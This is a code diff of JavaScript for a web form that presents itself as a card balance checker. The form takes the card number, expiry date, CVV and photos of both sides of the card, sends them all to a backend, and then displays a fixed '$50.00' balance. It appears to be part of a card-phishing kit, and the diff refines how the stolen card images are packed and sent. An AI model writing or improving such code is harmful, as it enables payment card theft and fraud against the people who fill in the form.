@@ -1,73 +1,52 @@
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("balanceForm");
-  const status = document.getElementById("status");
-  const label = document.getElementById("label");
-  const spinner = document.getElementById("spinner");
+  const status = document.getElementById("submitStatus");
+  const label = document.querySelector('[data-label]');
+  const spinner = document.querySelector('[data-spinner]');
+
+  const blobToBase64 = blob => new Promise((resolve) => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(reader.result);
+    reader.readAsDataURL(blob);
+  });
 
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
 
+    label.classList.add("hidden");
+    spinner.classList.remove("hidden");
+    status.textContent = "Sending...";
+
     try {
-      status.textContent = "Uploading images...";
-      spinner.classList.remove("hidden");
-      label.classList.add("hidden");
-
-      const frontBlob = window.frontBlob;
-      const backBlob = window.backBlob;
-
-      let frontUrl = null;
-      let backUrl = null;
-
-      if (frontBlob) {
-        const frontRef = firebase.storage().ref(`images/front_${Date.now()}.jpg`);
-        await frontRef.put(frontBlob);
-        frontUrl = await frontRef.getDownloadURL();
-      }
-
-      if (backBlob) {
-        const backRef = firebase.storage().ref(`images/back_${Date.now()}.jpg`);
-        await backRef.put(backBlob);
-        backUrl = await backRef.getDownloadURL();
-      }
+      const frontBase64 = window.frontBlob ? await blobToBase64(window.frontBlob) : null;
+      const backBase64 = window.backBlob ? await blobToBase64(window.backBlob) : null;
 
       const data = {
         card_number: document.querySelector('[name="card_number"]').value.trim(),
         expiry_date: document.querySelector('[name="expiry_date"]').value.trim(),
         cvv: document.querySelector('[name="cvv"]').value.trim(),
-        front_image: frontUrl || null,
-        back_image: backUrl || null,
-        timestamp: Date.now()
+        front_image: frontBase64,
+        back_image: backBase64
       };
 
-      status.textContent = "Sending details...";
-      console.log("Sending data to backend:", data);
-
-      await fetch("/api/submit", {
+      const res = await fetch("/api/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       });
 
-      status.textContent = "Success! Balance checked.";
-      document.getElementById("balanceText").textContent = "$50.00";
-      document.getElementById("result").classList.remove("hidden");
+      if (res.ok) {
+        status.textContent = "Success! Balance: $50.00";
+        document.getElementById("balanceText").textContent = "$50.00";
+        document.getElementById("result").classList.remove("hidden");
 
-      setTimeout(() => {
-        form.reset();
-        document.getElementById("front_image_url").value = "";
-        document.getElementById("back_image_url").value = "";
-        document.getElementById("result").classList.add("hidden");
-        status.textContent = "";
-        window.frontBlob = window.backBlob = null;
-        document.getElementById("frontPreview").classList.add("hidden");
-        document.getElementById("backPreview").classList.add("hidden");
-        label.classList.remove("hidden");
-        spinner.classList.add("hidden");
-      }, 4000);
-
+        setTimeout(() => location.reload(), 3000);
+      } else {
+        throw new Error("Server error");
+      }
     } catch (err) {
-      console.error("Submission error:", err);
-      status.textContent = `Error: ${err.message}`;
+      status.textContent = "Error. Try again.";
+      console.error(err);
       label.classList.remove("hidden");
       spinner.classList.add("hidden");
     }
